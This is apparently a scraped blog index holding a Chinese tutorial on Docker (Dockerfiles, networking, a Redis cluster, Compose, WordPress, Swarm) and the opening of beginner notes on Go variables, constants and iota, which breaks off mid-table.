DockerFile面向开发。\nDockerFile：构建文件，定义了一切的步骤，源代码。\nDockerImage：通过DockerFile构建生成的镜像，最终发布和运行的产品。\nDocker容器：镜像运行起来提供服务。\nDockerFile指令 实战centos部署 DockerHub大部分镜像都是由基础镜像scratch组成，然后配置需要的软件和配置。\n# 1.编写DockerFile文件 FROM centos MAINTAINER dc\u0026lt;1107762686@qq.com\u0026gt; ENV MYPATH /usr/local WORKDIR $MYPATH RUN yum -y install vim RUN yum -y install net-tools EXPOSE 80 CMD echo $MYPATH CMD echo \u0026#34;-----end-----\u0026#34; CMD /bin/bash # 2.通过文件构建镜像 docker build -f mydockerfile -t mycentos:1.0 . # 运行结果 Successfully built b8fab89ecdea Successfully tagged mycentos:1.0 # 3.测试运行 docker run -it mycentos:1.0 # 列出本地进行的变更历史 docker history image-id  CMD 和 ENTRYPOINT 的区别\n CMD\t# 指定容器启动时要运行的命令，只有最后一个生效，且可被替代 ENTRYPOINT\t# 同CMD，可以追加命令 测试CMD\n# 编写DockerFile文件 vim dockerfile-cmd-test FROM centos CMD [\u0026#34;ls\u0026#34;,\u0026#34;-a\u0026#34;] # 构建镜像 docker build -f dockerfile-cmd-test -t cmd-test . # RUN运行，发现`ls -a`命令生效 docker run `id` # 想追加一个命令 ls -al docker run `id` -l # error # cmd清理 -l 替换了CMD [\u0026#34;ls\u0026#34;,\u0026#34;-a\u0026#34;]命令，-l不是命令所以报错 测试ENTRYPOINT\n# 编写DockerFile文件 vim dockerfile-cmd-entrypoint FROM centos ENTRYPOINT [\u0026#34;ls\u0026#34;,\u0026#34;-a\u0026#34;] # 构建镜像 docker build -f dockerfile-cmd-entrypoint -t entrypoint-test . DockerFile中很多命令都相似，我们需要了解其中的区别，最好的学习就是对比并测试。\n实战tomcat部署  准备镜像文件，tomcat压缩包，jdk压缩包 编写DockerFile文件，官方命名Dockerfile，build会自动寻找这个文件，不需要-f指定  FROM centos MAINTAINER dc\u0026lt;1107762686@qq.com\u0026gt; COPY readme.txt /usr/local/readme.txt ADD apache-tomcat-9.0.22.tar.gz /usr/local ADD jdk-8u281-linux-x64.tar.gz /usr/local RUN yum -y install vim ENV MYPATH /usr/local WORKDIR $MYPATH ENV JAVA_HOME /usr/local/jdk-8u281 ENV CLASS_PATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.22 ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.22 ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin EXPOSE 8080 CMD /usr/local/apache-tomcat-9.0.22/bin/startup.sh \u0026amp;\u0026amp; tail -F /usr/local/apache-tomcat-9.0.22/bin/logs/catalina.out 3.构建镜像\ndocker build -t diy-tomcat . 4.启动镜像\ndocker run -d -p 9090:8080 --name dc-tomcat -v /home/tomcat/test:/url/local/apache-tomcat-9.0.22/webapps/test -v /home/tomcat/tomcat-logs/:/usr/local/apache-tomcat-9.0.22/logs diy-tomcat 5.进入容器\ndocker exec -it `随意复制一段id` /bin/bash 6.访问测试\ncurl localhost:9090 7.发布项目(做了卷挂载，直接在本地发布即可)\nxml文件 jsp文件 项目部署成功。\n发布镜像  DockerHub\n 1.登录DockerHub\ndocker login -u username -p password 2.在服务器上提交镜像\ndocker tag [image-id/image-name:tag] new-image-name:tag\rdocker push image-id:tag/image-name:tag\r aliyun镜像\n 1.登录阿里云\n2.进入容器镜像服务\n3.创建命名空间\n4.创建容器镜像\n5.参考官方文档\nDocker网络 Docker0 问题：docker是如何处理容器网络访问的？\n我们首先创建一个tomcat容器，利用学到的两类方法来试试。\n 方式一，手动执行\n docker run -d -P --name tomcat-01 tomcat docker exec -it tomcat-01 ip addr  方式二，编写DockerFile\n # DockerFile内容 FROM tomcat MAINTAINER dc\u0026lt;1107762686@qq.com\u0026gt; CMD docker run -d -P --name tomcat-01 tomcat CMD docker exec -it tomcat-01 ip addr # 构建镜像 docker build -f dockerfile -t tomcat-test . 方法有误，稍后修改。\n容器启动的时候会得到一个docker分配的eth@if262ip地址。\n测试：Linux能ping通容器内部ip地址。\n 原理\n 每安装并启动一个Docker容器，Docker就会给其分配一个ip，只要安装了Docker，就会有一个docker0网卡。\ndocker0网卡使用桥接模式，使用veth-pair技术。\n再启动一个容器就会多一对网卡。\n7: veth4f1ae6f@if6 docker exec -it tomcat-02 ping `ip` #tomcat-02可以ping通tomcat-01 # 容器之间可以互通  小结\n Docker使用的是Linux的桥接，宿主机中是一个Docker容器的网桥。\nDocker中所有的网络接口都是虚拟的，转发效率高。\n容器删除，则对应的一对网桥也被回收。\n\u0026ndash;link  思考场景\n 编写了一个微服务，database url=ip:，项目不重启，数据库ip换掉，如何进行处理？\ndocker exec -it tomcat-02 ping tomcat-01 # 无法直接ping通 # 启动一个tomcat-03，并与tomcat-02连接 docker run -d -P --name tomcat-03 --link tomcat-02 tomcat # 实现通过名称ping通，但是反向无法ping通 # 其实就是tomcat-03在本地配置了tomcat-02 # 查看tomcat-03 hosts配置 docker exec -it tomcat-03 cat /etc/hosts \u0026ndash;link就是在hosts配置中增加了一个映射，已经不建议使用。\ndocker0问题：不支持容器名进行连接访问。\n自定义网络 # 查看所有docker网络 docker network ls 网络模式\n# --net bridge 为默认参数 docker run -d -P --name tomcat-01 --net bridge tomcat # docker0特点：默认不能通过名称访问，通过 --link 打通连接 # 可以自定义一个网络 docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet # 查看网络概览 docker network ls # 查看详细信息 docker network inspect mynet # 使用自己的网络 docker run -d -P --name tomcat-mynet-01 --net mynet tomcat docker run -d -P --name tomcat-mynet-02 --net mynet tomcat # ping测试 docker exec -it tomcat-mynet-01 ping tomcat-mynet-02 # 两者互相可ping通 优点：\nredis、mysql：不同集群使用不同网络，保证集群是安全和健康的。\n网络连通 # 启动两个容器 docker run -d -P --name tomcat-01 tomcat docker run -d -P --name tomcat-02 tomcat # 已知tomcat-01与tomcat-02无法ping通 # 连接网络 docker network connect mynet tomcat-01 docker network connect mynet tomcat-02 # 查看 mynet docker network inspect mynet # 其中包含了tomcat-01与tomcat-02 # 四个容器完美ping通 实战Redis集群部署 # 使用脚本部署 docker network create redis --subnet 172.42.0.0/16 # 通过脚本创建六个redis配置 for port in $(seq 1 6); do mkdir -p /mydata/redis/node-${port}/conf touch /mydata/redis/node-${port}/conf/redis.conf cat \u0026lt;\u0026lt; EOF \u0026gt;/mydata/redis/node-${port}/conf/redis.conf port 6379 bind 0.0.0.0 cluster-enabled yes cluster-config-file nodes.conf cluster-node-timeout 5000 cluster-announce-ip 172.42.0.1${port} cluster-announce-port 6379 cluster-announce-bus-port 16379 appendonly yes EOF done docker run -p 637${port}:6379 -p 1637${port}:16379 --name redis-${port} -v /mydata/redis/node-${port}/data:/data -v /mydata/redis/node-${port}/conf/redis.conf:/etc/redis/redis.conf -d --net redis --ip 172.42.0.1${port} redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conf; # 1-6依次修改即可 docker run -p 6371:6379 -p 16371:16379 --name redis-1 \\ -v /mydata/redis/node-1/data:/data \\ -v /mydata/redis/node-1/conf/redis.conf:/etc/redis/redis.conf \\ -d --net redis --ip 172.42.0.11 redis:5.0.9-alpine3.11 redis-server /etc/redis/redis.conf # 进入容器 docker exec -it redis-1 /bin/sh # redis中为sh # 创建集群 redis-cli --cluster create 172.42.0.11:6379 172.42.0.12:6379 172.42.0.13:6379 172.42.0.14:6379 172.42.0.15:6379 172.42.0.16:6379 --cluster-replicas 1 # 查看集群数量 redis-cli -c cluster info cluster nodes set a b get a # 第一次get会提示`Could not connect to Redis at 172.42.0.13:6379: Host is unreachable` # 重新进入 redis-cli -c get a # `Redirected to slot [15495] located at 172.42.0.14:6379 \u0026#34;b\u0026#34;` cluster nodes `redis-3状态为master,fail，redis-4状态为myself,master` SpringBoot微服务打包Docker镜像  构建SpringBoot项目 打包应用 编写DockerFile 构建镜像 发布运行  # DockerFile\rFROM java:8\rCOPY *.jar /app.jar\rCMD [\u0026quot;--server.port=8080\u0026quot;]\rEXPOSE 8080\rENTRYPOINT [\u0026quot;java\u0026quot;,\u0026quot;-jar\u0026quot;,\u0026quot;/app.jar\u0026quot;]\r# 构建\rdocker build -t image-name .\rDocker Compose 概述 官方概述\n轻松高效管理容器，定义运行多个容器。\n一键启动/停止服务。\n三步骤 1.Define your app\u0026rsquo;s environment with a Dockerfile so it can be reproduced anywhere.\n Dockerfile 保证我们的项目在任何地方可以运行  2.Define the services that make up your app in docker-compose.yml so they can be run together in an isolated environment.\n services 什么是服务 docker-compose.yml 文件应该怎么写  3.Run docker-compose up and Compose starts and runs your entire app.\n 启动项目  作用：批量容器编排\n 理解\n Compose 是 Docker 官方开源项目，需要安装。\nDockerfile让程序在任何地方运行。\nversion: \u0026#39;2.0\u0026#39; services: web: build: . ports: - \u0026#34;5000:5000\u0026#34; volumes: - .:/code - logvolume01:/var/log links: - redis redis: image: redis volumes: logvolume01: {} docker-compose up 100个服务\nCompose重要的两个概念：\n 服务 services，容器、应用(web、redis、mysql\u0026hellip;) 项目 project，一组关联容器  安装Docker Compose 官方安装文档\n1.下载\n# 官方下载，从GitHub下载，巨慢\rsudo curl -L \u0026quot;https://github.com/docker/compose/releases/download/1.28.5/docker-compose-$(uname -s)-$(uname -m)\u0026quot; -o /usr/local/bin/docker-compose\r# 国内镜像\rcurl -L https://get.daocloud.io/docker/compose/releases/download/1.24.0/docker-compose-`uname -s`-`uname -m` \u0026gt; /usr/local/bin/docker-compose\r# 查看是否下载成功\rcd /usr/local/bin\rls\r2.授权\nchmod +x /usr/local/bin/docker-compose # 或 chmod 777 /usr/local/bin/docker-compose # 任意位置运行 docerk-compose version 查看是否成功 初使用 使用教程\n1.创建项目文件夹\n2.项目文件夹下创建app.py文件，将官网代码复制过来\nimport time import redis from flask import Flask app = Flask(__name__) cache = redis.Redis(host=\u0026#39;redis\u0026#39;, port=6379) def get_hit_count(): retries = 5 while True: try: return cache.incr(\u0026#39;hits\u0026#39;) except redis.exceptions.ConnectionError as exc: if retries == 0: raise exc retries -= 1 time.sleep(0.5) @app.route(\u0026#39;/\u0026#39;) def hello(): count = get_hit_count() return \u0026#39;Hello World! I have been seen {} times.\\n\u0026#39;.format(count) 3.创建requirements.txt依赖包文件\n4.创建Dockerfile\nFROM python:3.7-alpine\t# 基本环境包 WORKDIR /code\t# 工作目录 ENV FLASK_APP=app.py\t# 环境 ENV FLASK_RUN_HOST=0.0.0.0 RUN apk add --no-cache gcc musl-dev linux-headers\t# 运行 COPY requirements.txt requirements.txt\t# 拷贝文件 RUN pip install -r requirements.txt\t# 使用pip安装 EXPOSE 5000\t# 暴露端口 COPY . .\t# 拷贝当前目录 CMD [\u0026#34;flask\u0026#34;, \u0026#34;run\u0026#34;]\t# 运行 5.在Compose文件中定义服务\n# 以前我们需要docker run逐个运行 # 现在创建docker-compose.yml文件 version: \u0026#34;3.9\u0026#34;\t# 版本 services:\t# 服务 web: build: . ports: - \u0026#34;5000:5000\u0026#34; redis: image: \u0026#34;redis:alpine\u0026#34; 6.使用Compose构建并运行应用\ndocker-compose up # docker-compose up -d 后台运行 # 我这里报错了，报错如下： ERROR: Version in \u0026#34;./docker-compose.yml\u0026#34; is unsupported. You might be seeing this error because you\u0026#39;re using the wrong Compose file version. Either specify a supported version (e.g \u0026#34;2.2\u0026#34; or \u0026#34;3.3\u0026#34;) and place your service definitions under the `services` key, or omit the `version` key and place your service definitions at the root of the file to use version 1. For more on the Compose file format versions, see https://docs.docker.com/compose/compose-file/ # 解决方案，修改docker-compose.yml文件中的版本 version: \u0026#34;3.9\u0026#34; -\u0026gt; version: \u0026#34;3.3\u0026#34; # 项目部署过程中出现了其它错误 docker-compose build # 先build一下 docker-compose up # 成功启动 # 测试，每访问一次计数器+1 localhost:5000 # 浏览器键入 curl localhost:5000 # curl请求 7.停止\n# 在yaml文件所在目录下运行命令 docker-compose stop Ctrl+C 流程：\n1.创建网络\n2.执行Docker-compose.yml\n3.启动服务\n默认规则：\n自动拉取镜像\n[root@localhost ~]# docker service ls Error response from daemon: This node is not a swarm manager. Use \u0026#34;docker swarm init\u0026#34; or \u0026#34;docker swarm join\u0026#34; to connect this node to swarm and try again. **命名规则：**默认服务名 文件名_服务名_num。A B _num 副本数量。集群状态下不可能只有一个运行实例。弹性：10 HA 高可用、高并发。kunectl service负载均衡。\n**网络规则：**使用命令docker network ls查看，默认名称composetest_default。项目中的内容都在同一网络，可通过域名访问。\n小结：\n1.应用，如app.py\n2.Dockerfile应用打包为镜像\n3.Docker-compose.yml文件(定义整个服务、需要的环境)。完整的上线服务\n4.启动compose项目(docker-compose up)\nyaml规则 官方示例\ndocker-compose.yml是核心。\n# 只有三层 version: \u0026#39;\u0026#39; # 版本 services: # 服务 服务1: web # 服务配置 images build network ... 服务2: redis ... # 其他配置 网络/卷/全局规则 volumes: networks: configs: depends_on\nSimple example:\nversion: \u0026#34;3.9\u0026#34; services: web: build: . depends_on:\t# 依赖于db和redis - db - redis redis: image: redis db: image: postgres # 启动顺序：web --\u0026gt; redis --\u0026gt; db  There are several things to be aware of when using depends_on:\n depends_on does not wait for db and redis to be “ready” before starting web - only until they have been started. If you need to wait for a service to be ready, see Controlling startup order for more on this problem and strategies for solving it. Version 3 no longer supports the condition form of depends_on. The depends_on option is ignored when deploying a stack in swarm mode with a version 3 Compose file.   deploy\n Added in version 3 file format.\n Specify configuration related to the deployment and running of services. This only takes effect when deploying to a swarm with docker stack deploy, and is ignored by docker-compose up and docker-compose run.\nversion: \u0026#34;3.9\u0026#34; services: redis: image: redis:alpine deploy: replicas: 6\t# 副本 placement: max_replicas_per_node: 1 update_config: parallelism: 2 delay: 10s restart_policy: condition: on-failure 部署wp博客 官方文档部署WordPress博客\n1.创建一个空文件夹，此处命名为my_wordpress\nmkdir my_wordpress\r2.切换到对应目录\ncd my_wordpress/\r3.创建docker-compose.yml文件\nversion: \u0026#34;3.3\u0026#34; services: db: image: mysql:5.7 volumes: - db_data:/var/lib/mysql restart: always environment: MYSQL_ROOT_PASSWORD: somewordpress MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress wordpress: depends_on: - db image: wordpress:latest ports: - \u0026#34;8000:80\u0026#34; restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpress volumes: db_data: {}  Notes:\n The docker volume db_data persists any updates made by WordPress to the database. Learn more about docker volumes WordPress Multisite works only on ports 80 and 443.   4.构建项目\nNow, run docker-compose up -d from your project directory.\nThis runs docker-compose up in detached mode, pulls the needed Docker images, and starts the wordpress and database containers.\n$ docker-compose up -d  Note: WordPress Multisite works only on ports 80 and/or 443. If you get an error message about binding 0.0.0.0 to port 80 or 443 (depending on which one you specified), it is likely that the port you configured for WordPress is already in use by another service.\n 5.开始安装\n经过第4步后，访问localhost:8000端口即可设置博客。\n实战 1.编写项目微服务\n2.Dockefile构建镜像\n3.docker-compose.yaml编排项目\n4.docker-compose up\n5.docker-compose up --build项目重新部署打包\nDocker Swarm Docker Swarm官方文档\n节点如何工作： Docker Engine 1.12 introduces swarm mode that enables you to create a cluster of one or more Docker Engines called a swarm. A swarm consists of one or more nodes: physical or virtual machines running Docker Engine 1.12 or later in swarm mode.\nThere are two types of nodes: managers and workers.\nIf you haven’t already, read through the swarm mode overview and key concepts.\n管理与工作节点 管理节点 Manager nodes handle cluster management tasks:\n maintaining cluster state scheduling services serving swarm mode HTTP API endpoints  Using a Raft implementation, the managers maintain a consistent internal state of the entire swarm and all the services running on it. For testing purposes it is OK to run a swarm with a single manager. If the manager in a single-manager swarm fails, your services continue to run, but you need to create a new cluster to recover.\nTo take advantage of swarm mode’s fault-tolerance features, Docker recommends you implement an odd number of nodes according to your organization’s high-availability requirements. When you have multiple managers you can recover from the failure of a manager node without downtime.\n  A three-manager swarm tolerates a maximum loss of one manager.\n  A five-manager swarm tolerates a maximum simultaneous loss of two manager nodes.\n  An N manager cluster tolerates the loss of at most (N-1)/2 managers.\n  Docker recommends a maximum of seven manager nodes for a swarm.\n Important Note: Adding more managers does NOT mean increased scalability or higher performance. In general, the opposite is true.\n   工作节点 Worker nodes are also instances of Docker Engine whose sole purpose is to execute containers. Worker nodes don’t participate in the Raft distributed state, make scheduling decisions, or serve the swarm mode HTTP API.\nYou can create a swarm of one manager node, but you cannot have a worker node without at least one manager node. By default, all managers are also workers. In a single manager node cluster, you can run commands like docker service create and the scheduler places all tasks on the local Engine.\nTo prevent the scheduler from placing tasks on a manager node in a multi-node swarm, set the availability for the manager node to Drain. The scheduler gracefully stops tasks on nodes in Drain mode and schedules the tasks on an Active node. The scheduler does not assign new tasks to nodes with Drain availability.\nRefer to the docker node update command line reference to see how to change node availability.\nRaft 图中有一个Raft Consensus Group的概念，我们来查阅一下资料。\nRaft：一种新的分布式协议研究，为真实世界应用建立的协议，主要注重协议落地性和可理解性。保证大多数节点存活才可使用。\n关于分布式系统的Raft算法讲解\nRaft算法详解\n命令 # 帮助命令 docker swarm --help Usage: docker swarm COMMAND Manage Swarm Commands: ca Display and rotate the root CA init Initialize a swarm join Join a swarm as a node and/or manager join-token Manage join tokens leave Leave the swarm unlock Unlock swarm unlock-key Manage the unlock key update Update the swarm docker swarm init\t# 初始化节点 docker swarm join\t# 加入节点 # 获取令牌 docker swarm join-token manager docker swarm join-token worker docker node ls # 查看节点 具体使用 服务无感升级为灰度发布(也称金丝雀发布)。\ndocker run\t# 容器启动，不具有扩缩容功能 docker service 服务\t# 能实现扩缩容及滚动更新 docker service create -p 8888:80 --name my-nginx nginx # 查看服务 docker service ps my-nginx docker service ls docker service inspect my-nginx # 创建副本 docker service update --replicas 3 my-nginx docker service update --replicas 1 my-nginx # 更新为1个服务 docker service scale my-nginx=5\t# 动态扩缩容，与update效果相同 docker service rm my-nginx 概念总结 Swarm 集群的管理和编号。docker可以初始化一个swarm集群，其它节点可以加入。(manager、worker)\nNode 就是一个docker节点，多个节点组成一个网络集群。\nService 任务，可以在manager或worker来运行。用户访问的其实就是service，这是集群的核心。\nTask 容器内命令，细节任务。\n调整service运行方式 docker service create --mode replicated --name my-centos centos\t# 仅在副本运行 docker service create --mode global --name haha alpine ping baidu.com\t# 全局运行 拓展 网络模式：\u0026ldquo;PublishMode\u0026rdquo;:\u0026ldquo;ingress\u0026rdquo;\nSwarm:\nOverlay:网络变成一个整体\ningress:特殊的Overlay网络，具有负载均衡功能\nDocker Stack docker-compose\t# 单机部署项目 docker-compose up -d wordpress.yaml docker stack\t# 集群部署 docker stack deploy wordpress.yaml Docker Secret Commands: create Create a secret from a file or STDIN as content inspect Display detailed information on one or more secrets ls List secrets rm Remove one or more secrets Docker Config Commands:\rcreate Create a config from a file or STDIN\rinspect Display detailed information on one or more configs\rls List configs\rrm Remove one or more configs\r","permalink":"https://oopsdc.github.io/post/docker/","summary":"Docker概述 镜像(image)：\n一个只读模板。一个镜像可以用来创建多个Docker容器，好似Java中的类和对象，镜像是类，容器是对象。\r容器(container)：\nDocker利用容器独立运行一个或一组应用，容器是用镜像创建的运行实例。\r容器可以被启动、开始、停止、删除。\r每个容器都是相互个隔离的。\r也可以把容器看做一个简易版Linux环境(包括root用户权限、进程空间、用户空间和网络空间等)及运行在其中的应用程序。\r容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器最上面一层可读可写。\r仓库(repository)：\n仓库是集中存放镜像文件的场所。\r仓库和仓库注册服务器(registry)是有区别的，后者往往存在多个仓库，每个仓库又存在多个镜像，每个镜像有不同的标签。\r仓库分为公开仓库和私有仓库两种形式。\r最大的公开仓库是Docker Hub，国内最大的为阿里云、网易云等。\rDocker安装  环境：CentOS 7\n 1.官方文档\n2.yum安装gcc相关环境\nyum -y install gcc yum -y install gcc-c++ 3.卸载旧版本\nyum remove docker \\ \tdocker-client \\ \tdocker-client-latest \\ \tdocker-common \\ \tdocker-latest \\ \tdocker-latest-logrotate \\ \tdocker-logrotate \\ \tdocker-engine 4.安装依赖包\nyum install -y yum-utils 5.设置镜像仓库\n# 错误 yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo ## 报错 [Errno 14] curl#35 - TCP connection reset by peer [Errno 12] curl#35 - Timeout # 推荐国内镜像 yum-config-manager --add-repo http://mirrors.","title":"Docker"},{"content":"runoob教程：https://www.runoob.com/go/go-tutorial.html\n环境搭建 安装包官方下载地址：https://golang.org/dl/\n国内能打开的地址：https://golang.google.cn/dl/\nWindows安装go 安装包下载 这里我选择下载msi文件上面的go1.16.2.windows-amd64.zip压缩包，然后放在环境目录D:\\Env\\go1.16.2\\bin下解压。\n环境配置 将go目录下的/bin路径添加到Path环境变量中，点击新建。\n检测安装 打开cmd输入go。\nhello-world 在工作目录创建hello.go文件。\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello, World!\u0026#34;) } 使用go run命令运行：\ngo run hello.go go build生成二进制文件运行：\n\u0026gt; go build .\\hello.go \u0026gt; ls Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2021/3/15 10:50 2094592 hello.exe -a---- 2021/3/15 10:47 79 hello.go \u0026gt; .\\hello.exe Hello, World! Linux安装go 环境：Ubuntu 20.04.1(推荐使用WSL，但现在电脑上没配置，就在虚拟机上做了)\n官方安装文档：https://golang.google.cn/doc/install?download=go1.16.2.linux-amd64.tar.gz\n安装包下载 下载go1.16.2.linux-amd64.tar.gz压缩文件。\n解压 $ sudo tar -zxvf go1.16.2.linux-amd64.tar.gz 设置环境变量 $ export PATH=$PATH:/usr/local/go/bin 检测安装 $ go version 问题处理 本来想通过VMware Tools把压缩文件直接从主机拖到虚拟机的，但尝试本地解压VMware Tools失败，报错显示内存不足，尝试解压到其它目录。解决方法如下：\n$ sudo tar -xzvf VmwareTools.tar.gz -C /home/oopsdc\t# -C 后指定解压目录，我这里直接解压到用户目录下 $ cd /home/oopsdc/vmware-tools-distrib/\t# 切换到对应目录 $ sudo ./vmware-install.pl\t# 运行安装文件即可 Go语言结构 Go语言基础组成有以下几部分：\n 包声明 引入包 函数 变量 语句\u0026amp;表达式 注释  我们以之前hello.go的代码为例。\npackage main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;Hello, World!\u0026#34;) }  第一行package main定义了包名。我们必须在源文件非注释的第一行指明这个文件属于哪个包。如package main表示一个可独立执行的程序，每个Go应用程序都包含一个main包。 第三行import fmt告诉Go编译器这个程序需要使用fmt包的函数或其他元素。fmt包中有实现格式化I/O的函数。 第五行的func main()为程序开始执行的函数。main函数是每个可执行程序必须包含的，除init()函数外一般都是第一个执行的函数。 fmt.Println()可以将字符串输出到控制台并自动换行，效果与fmt.Println(\u0026quot;Hello,World\\n\u0026quot;)相同。其中，Println和Print函数支持使用变量，如fmt.Println(arr)，若不加特别指令，会以默认打印格式将变量arr输出到控制台。 当标识符(如变量、常量、类型、函数名及结构字段等)以一个大写字母开头，如：Variable1，那么使用这种形式的标识符对象就可以被外部包代码所使用(需要先导入这个包)，这被称为导出(像面向对象语言中的public)；若标识符以小写字母开头，则对包外不可见，但在包内部可见并可用(类似protected)。 前括号{不能单独一行，否则会报错  func main() { // 错误  fmt.Println(\u0026#34;Hello, World!\u0026#34;) } 学习笔记 变量声明三种方式 方式一 指定变量类型，若未初始化则值为0。\nvar v_name v_type v_name = value 实例1：\npackage main import \u0026#34;fmt\u0026#34; func main() { // 声明一个变量并初始化  var a = \u0026#34;oopsdc\u0026#34; fmt.Println(a) // 没有初始化就为零值  var b int fmt.Println(b) // bool 零值为 false  var c bool fmt.Println(c) } 执行结果：\noopsdc\r0\rfalse\r 数值类型（包括complex64/128）为 0 布尔类型为 false 字符串为 \u0026quot;\u0026quot;（空字符串） 以下几种类型为 nil：  var a *int var a []int var a map[string] int var a chan int var a func(string) int var a error // error 是接口 实例2：\npackage main import \u0026#34;fmt\u0026#34; func main() { var i int var f float64 var b bool var s string fmt.Printf(\u0026#34;%v %v %v %q\\n\u0026#34;, i, f, b, s) } 执行结果：\n0 0 false \u0026quot;\u0026quot;\r方式二 根据值自行判断变量类型。\nvar v_name = value 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { var d = true fmt.Println(d) } 执行结果：\ntrue\r方式三 :=赋值，是使用变量的首选形式。**但只能被用在函数体内，不能够用于全局变量声明及赋值。**使用:=操作符可以高效创建一个变量。称之为初始化声明。\nv_name := value\r注：:=左侧需为未声明过的新变量，否则会报错。\n例：\nvar intVal int intVal :=1 // 这时候会产生编译错误  intVal,intVal1 := 1,2 // 此时不会产生编译错误，因为有声明新的变量，因为 := 是一个声明语句 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { f := \u0026#34;oopsdc\u0026#34; // var f string = \u0026#34;oopsdc\u0026#34;  fmt.Println(f) } 执行结果：\noopsdc\r多变量声明 //类型相同多个变量, 非全局变量 var vname1, vname2, vname3 type vname1, vname2, vname3 = v1, v2, v3 var vname1, vname2, vname3 = v1, v2, v3 // 和 python 很像,不需要显示声明类型，自动推断  vname1, vname2, vname3 := v1, v2, v3 // 出现在 := 左侧的变量不应该是已经被声明过的，否则会导致编译错误  // 这种因式分解关键字的写法一般用于声明全局变量 var ( vname1 v_type1 vname2 v_type2 ) 实例：\npackage main var x, y int var ( // 这种因式分解关键字的写法一般用于声明全局变量  a int b bool ) var c, d int = 1, 2 var e, f = 123, \u0026#34;hello\u0026#34; //这种不带声明格式的只能在函数体中出现 //g, h := 123, \u0026#34;hello\u0026#34;  func main(){ g, h := 123, \u0026#34;hello\u0026#34; println(x, y, a, b, c, d, e, f, g, h) } 执行结果：\n0 0 0 false 1 2 123 hello 123 hello\r空白标识符在函数返回值中的使用 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { _,numb,strs := numbers() //只获取函数返回值的后两个  fmt.Println(numb,strs) } //一个可以返回多个值的函数 func numbers()(int,int,string){ a , b , c := 1 , 2 , \u0026#34;str\u0026#34; return a,b,c } 执行结果：\n2 str\runsafe.sizeof()函数 实例如下：\npackage main import \u0026#34;unsafe\u0026#34; const ( a = \u0026#34;abc\u0026#34; b = len(a) c = unsafe.Sizeof(a) ) func main(){ println(a, b, c) } 运行结果：\nabc 3 16\r看到的时候没搞懂为什么c，即unsafe.Sizeof(a)的值为16，于是查了一下。\ncsdn文章：https://blog.csdn.net/zzuchengming/article/details/88628645\n 为什么字符串类型的unsafe.Sizeof()一直为16\n 实际中，字符串类型对应一个结构体，结构体有两个域。第一个域为指向该字符串的指针，第二个域是字符串长度，每个域占8字节，但并不包含指针指向的字符串内容，也就是说它的返回值一直为16。\niota特殊常量 iota介绍 是一个特殊常量，可认为是可被编译器修改的常量。\niota在const关键字出现时将被重置为 0(const内部的第一行之前)，const 中每新增一行常量声明将使iota计数一次(iota可理解为const语句块中的行索引)。\niota可被用作枚举值，第一个iota值为0，每当其在新的一行被引用时，值自动加1：\nconst ( a = iota\t// 1  b = iota\t// 2  c = iota\t// 3 ) 简写形式如下：\nconst ( a = iota b c ) iota用法 实例1：\npackage main import \u0026#34;fmt\u0026#34; func main() { const ( a = iota //0  b //1  c //2  d = \u0026#34;ha\u0026#34; //独立值，iota += 1  e //\u0026#34;ha\u0026#34; iota += 1  f = 100 //iota +=1  g //100 iota +=1  h = iota //7,恢复计数  i //8  ) fmt.Println(a,b,c,d,e,f,g,h,i) } 运行结果：\n\u0026gt; go run .\\iota1.go 0 1 2 ha ha 100 100 7 8 实例2：\npackage main import \u0026#34;fmt\u0026#34; const ( i=1\u0026lt;\u0026lt;iota j=3\u0026lt;\u0026lt;iota k l ) func main() { fmt.Println(\u0026#34;i =\u0026#34;,i) fmt.Println(\u0026#34;j =\u0026#34;,j) fmt.Println(\u0026#34;k =\u0026#34;,k) fmt.Println(\u0026#34;l =\u0026#34;,l) } 运行结果：\n\u0026gt; go run .\\iota2.go i = 1 j = 6 k = 12 l = 24 刚看到i=1\u0026lt;\u0026lt;iota的时候就想到了移位，以下是对结果的分析：\n\u0026lt;\u0026lt;n==*(2^n)\ri = 1 \u0026lt;\u0026lt; 0\t# 左移0位\ri = 001\ri = 1 * 2^0 = 1\rj = 3 \u0026lt;\u0026lt; 1\t# 左移1位\rj = 011 =\u0026gt; 110\rj = 3 * 2^1 = 6\rk = 3 \u0026lt;\u0026lt; 2\t# 左移2位\rk = 011 =\u0026gt; 1100\rk = 3 * 2^2 = 12\rl = 3 \u0026lt;\u0026lt; 3\t# 左移3位\rl = 011 =\u0026gt; 11000\rl = 3 * 2^3 = 24\r常量 常量是一个简单值的标识符，在程序运行过程中不会改变。\n常量中的数据类型只能为布尔型、数字型(整数型、浮点型和复数)及字符串型。\n常见常量定义格式：\nconst identifier [type] = value 类型说明符[type]可省略，因为编译器可根据变量值推断其类型。\n 显式类型定义：  const a string = \u0026#34;oopsdc\u0026#34;  隐式类型定义：  const a = \u0026#34;oopsdc\u0026#34; 多个常量定义：\nconst a_name1, a_name2 = value1, value2 实例：\npackage main import \u0026#34;fmt\u0026#34; func main() { const LENGTH int = 10 const WIDTH int = 5 var area int const a, b, c = 1, false, \u0026#34;str\u0026#34; //多重赋值  area = LENGTH * WIDTH fmt.Printf(\u0026#34;面积为 : %d\u0026#34;, area) println() println(a, b, c) } 执行结果：\n面积为 : 50\r1 false str\r常量用作枚举：\nconst ( Unknown = 0 Female = 1 Male = 2 ) 语言运算符 运算符用于在程序执行时执行数学或逻辑运算。\nGo语言内置运算符有：\n 算术运算符 关系运算符 逻辑运算符 位运算符 赋值运算符 其它运算符  其它运算符    运算符 描述 实例     \u0026amp; 返回变量存储地址 